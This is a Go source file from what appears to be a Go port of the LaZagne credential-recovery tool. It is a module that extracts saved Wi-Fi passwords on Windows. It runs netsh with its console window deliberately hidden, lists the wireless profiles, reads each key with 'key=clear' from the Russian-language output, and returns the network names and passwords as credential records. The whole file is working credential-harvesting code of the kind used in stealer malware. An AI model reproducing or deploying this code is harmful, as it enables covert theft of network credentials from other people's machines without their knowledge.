package wifi

import (
	"os/exec"
	"syscall"
	"github.com/aglyzov/charmap"
	"strings"
	"goLaZagne/common"
)

func ExecCommand(command string, params []string) string{
	cmd_li := exec.Command(command, params...)
	cmd_li.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} //Это необходимо для того что бы CMD запускалось в скрытом режиме
	output, _ := cmd_li.Output()
	if output != nil && len(output) > 0 {
		output = charmap.CP866_to_UTF8(output)
	}
	return string(output)
}

func WifiExtractDataRun() common.ExtractDataResult{
	params := []string{
		"wlan",
		"show",
		"profiles",
	}

	var output = ExecCommand("netsh", params)
	var lines = strings.Split(output, "\r\n")
	var users []string

	for i:=range lines{
		if strings.Contains(lines[i], "профили пользователей"){ //TODO ENGLISH
			users = append(users, strings.TrimSpace(strings.Split(lines[i], ":")[1]))
		}
	}

	var Result common.ExtractDataResult
	var data []common.CredentialsData
	for i:=0; i < len(users); i++{
		var paramWifi = []string{
			"wlan",
			"show",
			"profile",
			users[i],
			"key=clear",
		}

		var output = ExecCommand("netsh", paramWifi)
		var lines = strings.Split(output, "\r\n")

		for j:=range lines{
			if strings.Contains(lines[j], "Содержимое ключа"){ //TODO Английский
				var (
					dataAdd = common.CredentialsData{
						"local",
						users[i],
						strings.TrimSpace(strings.Split(lines[j], ":")[1]),
					}
				)
				data = append(data, dataAdd)
			}
		}
		if len(data) == 0 {
			Result.Success = false
			return Result
		}
	}
	Result.Data = data
	Result.Success = true
	return Result
}
